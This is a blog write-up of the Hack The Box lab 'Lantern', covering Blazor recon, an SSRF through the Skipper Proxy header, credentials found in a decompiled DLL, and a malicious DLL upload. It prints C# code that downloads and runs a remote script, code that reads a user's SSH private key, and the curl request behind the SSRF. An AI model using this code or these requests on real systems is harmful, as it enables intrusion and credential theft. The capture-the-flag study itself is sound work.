@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Lantern - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Lantern</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1724140121108"
+                  >2024-08-20 09:48</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1730402801124"
+                  >2024-10-31 20:26</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">blazor</span>
+              
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 07:43 UTC
+Nmap scan report for lantern.htb (10.129.160.228)
+Host is up (0.033s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)
+|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)
+80/tcp   open  http    Skipper Proxy
+|_http-title: Lantern
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 404 Not Found
+|     Content-Length: 207
+|     Content-Type: text/html; charset=utf-8
+|     Date: Tue, 20 Aug 2024 07:43:22 GMT
+|     Server: Skipper Proxy
+|     &lt;!doctype html&gt;
+|     &lt;html lang=en&gt;
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Content-Length: 225
+|     Content-Type: text/html; charset=utf-8
+|     Date: Tue, 20 Aug 2024 07:43:16 GMT
+|     Location: http://lantern.htb/
+|     Server: Skipper Proxy
+|     &lt;!doctype html&gt;
+|     &lt;html lang=en&gt;
+|     &lt;title&gt;Redirecting...&lt;/title&gt;
+|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href="http://lantern.htb/"&gt;http://lantern.htb/&lt;/a&gt;. If not, click the link.
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: HEAD, GET, OPTIONS
+|     Content-Length: 0
+|     Content-Type: text/html; charset=utf-8
+|     Date: Tue, 20 Aug 2024 07:43:16 GMT
+|_    Server: Skipper Proxy
+|_http-server-header: Skipper Proxy
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 500 Internal Server Error
+|     Connection: close
+|     Content-Type: text/plain; charset=utf-8
+|     Date: Tue, 20 Aug 2024 07:43:21 GMT
+|     Server: Kestrel
+|     System.UriFormatException: Invalid URI: The hostname could not be parsed.
+|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions&amp; creationOptions)
+|     System.Uri..ctor(String uriString, UriKind uriKind)
+|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)
+|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)
+|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)
+|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.&lt;InitializeStandardComponentServicesAsync&gt;g__InitializeCore|5_0(HttpContext httpContext)
+|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Content-Length: 0
+|     Connection: close
+|     Date: Tue, 20 Aug 2024 07:43:26 GMT
+|     Server: Kestrel
+|   Help: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|     Date: Tue, 20 Aug 2024 07:43:21 GMT
+|     Server: Kestrel
+|   RTSPRequest: 
+|     HTTP/1.1 505 HTTP Version Not Supported
+|     Content-Length: 0
+|     Connection: close
+|     Date: Tue, 20 Aug 2024 07:43:26 GMT
+|     Server: Kestrel
+|   SSLSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|     Date: Tue, 20 Aug 2024 07:43:41 GMT
+|_    Server: Kestrel</code></pre></div>
+<p><img src="/_resources/ee49b5fdb46846089bca65b35fd5a5f2.png" /></p>
+<p><img src="/_resources/21a66d8a0f324e3e8fc88ce931aae4cc.png" /></p>
+<p>This site seems to loose access to the server and then attempts to reconnect to it 8 times, after user presses “reconnect”.</p>
+<p><img src="/_resources/f4907a5160054cb7b9f66a81ee5db90d.png" /></p>
+<p><img src="/_resources/af100af3a4514290a49c5a22214515b1.png" /></p>
+<p>we cannot do a GET, but we can do a POST.</p>
+<p><img src="/_resources/856165503d024deba04b8149e61a502b.png" /></p>
+<p><img src="/_resources/90739ed04b9a4721ad2dd858dd0f1c12.png" /></p>
+<p>Using burp to see the requests being sent to the sites, we can always see “blazor”.<br />
+<code>{"protocol":"blazorpack","version":1}</code></p>
+<p><a title="https://en.wikipedia.org/wiki/Blazor" href="https://en.wikipedia.org/wiki/Blazor">https://en.wikipedia.org/wiki/Blazor</a><br />
+<a title="https://sensepost.com/blog/2023/decoding-blazorpack/" href="https://sensepost.com/blog/2023/decoding-blazorpack/">https://sensepost.com/blog/2023/decoding-blazorpack/</a><br />
+<a title="https://learn.microsoft.com/en-us/aspnet/core/blazor/security/server/interactive-server-side-rendering?view=aspnetcore-6.0" href="https://learn.microsoft.com/en-us/aspnet/core/blazor/security/server/interactive-server-side-rendering?view=aspnetcore-6.0">https://learn.microsoft.com/en-us/aspnet/core/blazor/security/server/interactive-server-side-rendering?view=aspnetcore-6.0</a></p>
+<p>Watching how the site reconnects to the server, we can see <code>http://lantern.htb:3000/_blazor</code> domain.<br />
+I have no idea whatsoever how does blazor works and if its possible to abuse, so Ive started reading all of the requests and learn about it.<br />
+We are sending also an ID param to the server.</p>
+<div><pre class="hljs"><code>GET /_blazor?id=cIma7InDfGqYfwz3dMu1vg HTTP/<span class="hljs-number">1.1</span>
+Host: lantern.htb:<span class="hljs-number">3000</span>
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">128.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">128.0</span>
+Accept: *<span class="hljs-comment">/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Sec-WebSocket-Version: 13
+Origin: http://lantern.htb:3000
+Sec-WebSocket-Key: 4Q64irlUUpSQ/YP3NR4j3Q==
+DNT: 1
+Connection: keep-alive, Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade: websocket</span></code></pre></div>
+<p>We can negotiate version of protocol.</p>
+<div><pre class="hljs"><code>POST /_blazor/negotiate?negotiateVersion=<span class="hljs-number">0</span> HTTP/<span class="hljs-number">1.1</span>
+Host: lantern.htb:<span class="hljs-number">3000</span>
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux x86_64; rv:<span class="hljs-number">128.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">128.0</span>
+Accept: *<span class="hljs-comment">/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://lantern.htb:3000/login
+Content-Type: text/plain;charset=UTF-8
+X-Requested-With: XMLHttpRequest
+X-SignalR-User-Agent: Microsoft SignalR/0.0 (0.0.0-DEV_BUILD; Unknown OS; Browser; Unknown Runtime Version)
+Content-Length: 0
+Origin: http://lantern.htb:3000
+DNT: 1
+Connection: close
+Sec-GPC: 1
+Priority: u=4
+Cache-Control: max-age=0</span></code></pre></div>
+<p>Searching for it on the net gives us some interesiting results. Unfortunetly, we would need to be logged in first.<br />
+<a title="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36558" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36558">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36558</a></p>
+<p>When running ffuf on 3000, we can find /error</p>
+<div><pre class="hljs"><code><span class="hljs-string">──╼</span> <span class="hljs-string">$ffuf</span> <span class="hljs-string">-u</span> <span class="hljs-string">http://lantern.htb:3000/FUZZ</span> <span class="hljs-string">-w</span> <span class="hljs-string">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span> <span class="hljs-string">-fr</span> <span class="hljs-string">"An unhandled exception has occurred. See browser dev tools for details."</span>
+
+        <span class="hljs-string">/'___\</span>  <span class="hljs-string">/'___\</span>           <span class="hljs-string">/'___\</span>       
+       <span class="hljs-string">/\</span> <span class="hljs-string">\__/</span> <span class="hljs-string">/\</span> <span class="hljs-string">\__/</span>  <span class="hljs-string">__</span>  <span class="hljs-string">__</span>  <span class="hljs-string">/\</span> <span class="hljs-string">\__/</span>       
+       <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">,__\\</span> <span class="hljs-string">\</span> <span class="hljs-string">,__\/\</span> <span class="hljs-string">\/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">,__\</span>      
+        <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_/</span>      
+         <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\____/</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_\</span>       
+          <span class="hljs-string">\/_/</span>    <span class="hljs-string">\/_/</span>   <span class="hljs-string">\/___/</span>    <span class="hljs-string">\/_/</span>       
+
+       <span class="hljs-string">v2.1.0-dev</span>
+<span class="hljs-string">________________________________________________</span>
+
+ <span class="hljs-string">::</span> <span class="hljs-attr">Method           :</span> <span class="hljs-string">GET</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">URL              :</span> <span class="hljs-string">http://lantern.htb:3000/FUZZ</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">Wordlist         : FUZZ:</span> <span class="hljs-string">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">Follow redirects :</span> <span class="hljs-literal">false</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">Calibration      :</span> <span class="hljs-literal">false</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">Timeout          :</span> <span class="hljs-number">10</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">Threads          :</span> <span class="hljs-number">40</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">Matcher          : Response status:</span> <span class="hljs-number">200</span><span class="hljs-number">-299</span><span class="hljs-string">,301,302,307,401,403,405,500</span>
+ <span class="hljs-string">::</span> <span class="hljs-attr">Filter           : Regexp:</span> <span class="hljs-string">An</span> <span class="hljs-string">unhandled</span> <span class="hljs-string">exception</span> <span class="hljs-string">has</span> <span class="hljs-string">occurred.</span> <span class="hljs-string">See</span> <span class="hljs-string">browser</span> <span class="hljs-string">dev</span> <span class="hljs-string">tools</span> <span class="hljs-string">for</span> <span class="hljs-string">details.</span>
+<span class="hljs-string">________________________________________________</span>
+
+<span class="hljs-string">error</span>                   [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">1490</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">340</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">38</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">54ms</span>]
+<span class="hljs-string">Error</span>                   [<span class="hljs-attr">Status:</span> <span class="hljs-number">200</span>, <span class="hljs-attr">Size:</span> <span class="hljs-number">1490</span>, <span class="hljs-attr">Words:</span> <span class="hljs-number">340</span>, <span class="hljs-attr">Lines:</span> <span class="hljs-number">38</span>, <span class="hljs-attr">Duration:</span> <span class="hljs-string">36ms</span>]
+<span class="hljs-string">::</span> <span class="hljs-attr">Progress:</span> [<span class="hljs-number">220560</span><span class="hljs-string">/220560</span>] <span class="hljs-string">::</span> <span class="hljs-string">Job</span> [<span class="hljs-number">1</span><span class="hljs-string">/1</span>] <span class="hljs-string">::</span> <span class="hljs-attr">1197 req/sec :: Duration:</span> [<span class="hljs-number">0</span><span class="hljs-string">:03:20</span>] <span class="hljs-string">::</span> <span class="hljs-attr">Errors: 0 ::</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/css/bootstrap/bootstrap.min.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/css/site.css"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">asp-append-version</span>=<span class="hljs-string">"true"</span> /&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content px-4"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-danger"</span>&gt;</span>Error.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-danger"</span>&gt;</span>An error occurred while processing your request.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
+
+                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>Request ID:<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>00-a99436d6b147390deef553662e2d4c26-2aea39b60a24c80f-00<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+
+            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Development Mode<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>
+                Swapping to the <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>Development<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> environment displays detailed information about the error that occurred.
+            <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>The Development environment shouldn't be enabled for deployed applications.<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>
+                It can result in displaying sensitive information from exceptions to end users.
+                For local debugging, enable the <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>Development<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> environment by setting the <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>ASPNETCORE_ENVIRONMENT<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> environment variable to <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>Development<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span>
+                and restarting the app.
+            <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div>
+<h1 id="cve-2022-38580">CVE-2022-38580</h1>
+<p>I was lost and asked for a hint on the official htb server. What I got from user 4wayhandshake was:</p>
+<blockquote>
+<p>SSRF can take many different forms. If the SSRF is in the web app  itself, you might see it result from a text input, or some kind of thing where you enter a URL or filepath maybe.<br />
+But what if the SSRF isn’t due to the web app at all? If the SSRF vulnerability is in the server, well maybe the way to access the SSRF is through the HTTP protocol itself 😃</p>
+</blockquote>
+<p>So I looked back at the nmap scan and realized that I was blind. I got back to the /vacancies submit pannel and got to work.</p>
+<p><img src="/_resources/9b02f95d61ec4aa5944f4c3de374948b.png" /></p>
+<p>Looking at nmap scan, we can that it is a “80/tcp   open  http    Skipper Proxy”. Looking on it online, we can find. <a title="https://www.exploit-db.com/exploits/51111" href="https://www.exploit-db.com/exploits/51111">https://www.exploit-db.com/exploits/51111</a>. Worth trying for sure.</p>
+<p>Looking at the blazor documentation, it seems that files are in <code>/_framework/</code> directory and it should have some dll files. I looked for dll files that are typicaly in blazor projects and tried to find ports that are open and serving this file on Burp Suite Intruder.</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">GET</span> <span class="hljs-string">/_framework/Microsoft.Extensions.DependencyInjection.dll</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>lantern.htb
+<span class="hljs-attribute">X-Skipper-Proxy</span><span class="hljs-punctuation">: </span>http://127.0.0.1:§port§
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+
+</code></pre></div>
+<p><img src="/_resources/b62d0a88faf24d299e92dfd151496ab9.png" /></p>
+<p>I did not know how to progress further, but reading more on the microsoft learn site, I found out that there is a blazor.boot.json file that should list all of the dlls.</p>
+<p><img src="/_resources/517f6566dbe24407aa95fff887998ca9.png" /></p>
+<p>It does exist on this server and tells us about InternaLantern.dll file.</p>
+<p><img src="/_resources/9c36ccc5f55e466cacca1d179c9f97c1.png" /></p>
+<p>We can run curl to grab it.</p>
+<div><pre class="hljs"><code>curl -o InternaLantern.dll http://10.129.171.126/_framework/InternaLantern.dll -H "Host: 10.129.171.126" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" -H "X-Skipper-Proxy: http://localhost:5000" -H "Connection: close"</code></pre></div>
+<p>I installed windows VM and downloaded JetBrains DotPeek, so I could analyze this file.<br />
+The first find was in “SqLiteFilename” and we learn that the SQLDB filename is Data.db.</p>
+<p>Then I got stuck again for a longer while, but continued to read everything that was in this dll.<br />
+Finally, I decided to decode the base64 encoded strings in IntenaLantern &gt; InternaLantern.Pages &gt; Internal.<br />
+Decoding the last base64 <code>U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTogMjEvMS8yMDI0LCBJbml0aWFsIGNyZWRlbnRpYWxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE</code> gives us <code>System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!</code></p>
+<p>We are in!</p>
+<p><img src="/_resources/1fba79be39a74195a1065f8091350569.png" /></p>
+<h1 id="admin-panel">Admin panel</h1>
+<p>We got here another upload option, probably our in once again.<br />
+Exploring the website further, choosing module that does not exist it gives us a info, that its executing modules from /opt/components.</p>
+<p><img src="/_resources/9dcec440c191440c9db845967440adac.png" /></p>
+<p>Now we have to try to understand how the upload works.</p>
+<p><img src="/_resources/4835235b0b40483bb397985461448f24.png" /></p>
+<p>Its again some blazor fun. This time I found out about a blazor addon for burp, that can be used to decode this gibberish. I created a malicious dll file using chat gpt and prayed that it works, as I never did anything similar to this.</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">using</span> System;
+<span class="hljs-keyword">using</span> System.IO;
+<span class="hljs-keyword">using</span> System.Net.Http;
+<span class="hljs-keyword">using</span> System.Threading.Tasks;
+<span class="hljs-keyword">using</span> Microsoft.AspNetCore.Components;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">YourNamespace.Components</span>
+{
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DownloadAndExecuteComponent</span> : <span class="hljs-title">ComponentBase</span>
+    {
+        [<span class="hljs-meta">Inject</span>] <span class="hljs-keyword">private</span> IHttpClientFactory HttpClientFactory { <span class="hljs-keyword">get</span>; <span class="hljs-keyword">set</span>; }
+
+        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnInitialized</span>(<span class="hljs-params"></span>)</span>
+        {
+            <span class="hljs-keyword">await</span> DownloadAndExecuteScript();
+        }
+
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">DownloadAndExecuteScript</span>(<span class="hljs-params"></span>)</span>
+        {
+            <span class="hljs-keyword">try</span>
+            {
+                <span class="hljs-keyword">var</span> httpClient = HttpClientFactory.CreateClient();
+
+                <span class="hljs-comment">// Replace with your actual URL</span>
+                <span class="hljs-keyword">var</span> scriptUrl = <span class="hljs-string">"https://example.com/path/to/your/script.sh"</span>;
+                <span class="hljs-keyword">var</span> scriptContent = <span class="hljs-keyword">await</span> httpClient.GetStringAsync(scriptUrl);
+
+                <span class="hljs-keyword">var</span> scriptPath = <span class="hljs-string">"/tmp/script.sh"</span>;
+                <span class="hljs-keyword">await</span> File.WriteAllTextAsync(scriptPath, scriptContent);
+
+                <span class="hljs-comment">// Set chmod 777</span>
+                <span class="hljs-keyword">var</span> chmodProcess = System.Diagnostics.Process.Start(<span class="hljs-string">"chmod"</span>, <span class="hljs-string">$"777 <span class="hljs-subst">{scriptPath}</span>"</span>);
+                chmodProcess.WaitForExit();
+
+                <span class="hljs-comment">// Execute the script</span>
+                <span class="hljs-keyword">var</span> executeProcess = System.Diagnostics.Process.Start(<span class="hljs-string">"/bin/bash"</span>, scriptPath);
+                executeProcess.WaitForExit();
+
+                Console.WriteLine(<span class="hljs-string">"Script executed successfully!"</span>);
+            }
+            <span class="hljs-keyword">catch</span> (Exception ex)
+            {
+                Console.WriteLine(<span class="hljs-string">$"An error occurred: <span class="hljs-subst">{ex.Message}</span>"</span>);
+            }
+        }
+    }
+}
+</code></pre></div>
+<p><a title="https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4" href="https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4">https://portswigger.net/bappstore/8a87b0d9654944ccbdf6ae8bdd18e1d4</a></p>
+<p><img src="/_resources/2bbd20895f97448482c5e52177e17aca.png" /></p>
+<p>Changing the file name to do path traversal works, but I had some errors with my DLL file.</p>
+<p><img src="/_resources/08737718de644b97a0f651c31b35be68.png" /></p>
+<p>At least I knew that it was there. It took me about ~5 minutes to realize that I am a moron and did not compile the file.</p>
+<p>Chat-gpt for the win again:</p>
+<div><pre class="hljs"><code>dotnet new classlib -n MyBlazorComponentLibrary
+<span class="hljs-built_in">cd</span> MyBlazorComponentLibrary
+dotnet add package Microsoft.AspNetCore.Components
+dotnet add package Microsoft.Extensions.Http
+dotnet build --configuration Release</code></pre></div>
+<p><img src="/_resources/cdbb996e8187401891837af8ce582b10.png" /></p>
+<p>At least we know that there is user thomas now. I tried to create a simple DLL to just get back hello, but still got the same error.</p>
+<div><pre class="hljs"><code>An error occured in <span class="hljs-regexp">/home/</span>tomas<span class="hljs-regexp">/LanternAdmin/</span>bin<span class="hljs-regexp">/Debug/</span>net6.<span class="hljs-number">0</span>/LanternAdmin.dll:
+Can not <span class="hljs-keyword">find</span> a type of <span class="hljs-string">'hi.Component, hi'</span> in <span class="hljs-regexp">/opt/</span>components/hi.dll</code></pre></div>
+<p>Couldnt get it to work and did not know if the problem was in code or in project config.</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">using</span> Microsoft.AspNetCore.Components;
+<span class="hljs-keyword">using</span> Microsoft.AspNetCore.Components.Rendering;
+<span class="hljs-keyword">using</span> System.IO;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">exploitProj</span>
+{
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Component</span> : <span class="hljs-title">ComponentBase</span>
+    {
+        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildRenderTree</span>(<span class="hljs-params">RenderTreeBuilder builder</span>)</span>
+        {
+            <span class="hljs-keyword">base</span>.BuildRenderTree(builder);
+            <span class="hljs-built_in">string</span> file = File.ReadAllText(<span class="hljs-string">"/home/tomas/.ssh/id_rsa"</span>);
+            builder.AddContent(<span class="hljs-number">0</span>, file);
+        }
+    }
+}</code></pre></div>
+<div><pre class="hljs"><code>An error occured in <span class="hljs-regexp">/home/</span>tomas<span class="hljs-regexp">/LanternAdmin/</span>bin<span class="hljs-regexp">/Debug/</span>net6.<span class="hljs-number">0</span>/LanternAdmin.dll:
+Can not <span class="hljs-keyword">find</span> a type of <span class="hljs-string">'1.Component, 1'</span> in <span class="hljs-regexp">/opt/</span>components/<span class="hljs-number">1</span>.dll</code></pre></div>
+<p>Testing further, I realized that I cannot change the .dll filen name. Also, I started getting new errors.</p>
+<p><img src="/_resources/b0a8d1bf80a24b86a6b5b26162e7e667.png" /></p>
+<p>After more hours of trial and error I somehow got it to work, god knows how. Got ssh for tomas.</p>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>Back to the usual stuff, linenum scan. It gets us:</p>
+<div><pre class="hljs"><code>[+] We can sudo without supplying a password!
+Matching Defaults entries for tomas on lantern:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tomas may run the following commands on lantern:
+    (ALL : ALL) NOPASSWD: /usr/bin/procmon</code></pre></div>
+<p>This surely will be used to get root.<br />
+<a title="https://en.wikipedia.org/wiki/Process_Monitor" href="https://en.wikipedia.org/wiki/Process_Monitor">https://en.wikipedia.org/wiki/Process_Monitor</a><br />
+More windows-on-linux stuff, great.</p>
+<p>Did not find anything new with linpeas_fat. I continued searching through everything that was accessible on this server. I’ve run pspy to see if there is anything going on and found:</p>
+<div><pre class="hljs"><code>2024/08/23 17:03:20 CMD: UID=0     PID=35858  | nano /root/automation.sh 
+2024/08/23 17:03:20 CMD: UID=0     PID=35857  | /usr/bin/expect -f /root/bot.exp </code></pre></div>
+<p>I’ve read up more on procmon and tried to find if I could somehow manipulate automation.sh. I did not find such option, but read that it is possible to export process. I found the process, did F6 and got a .db file. Downlaoding it using scp and checked using file what format is it.</p>
+<div><pre class="hljs"><code>sudo <span class="hljs-regexp">/usr/</span>bin/procmon -p <span class="hljs-number">35858</span> -e <span class="hljs-keyword">write</span></code></pre></div>
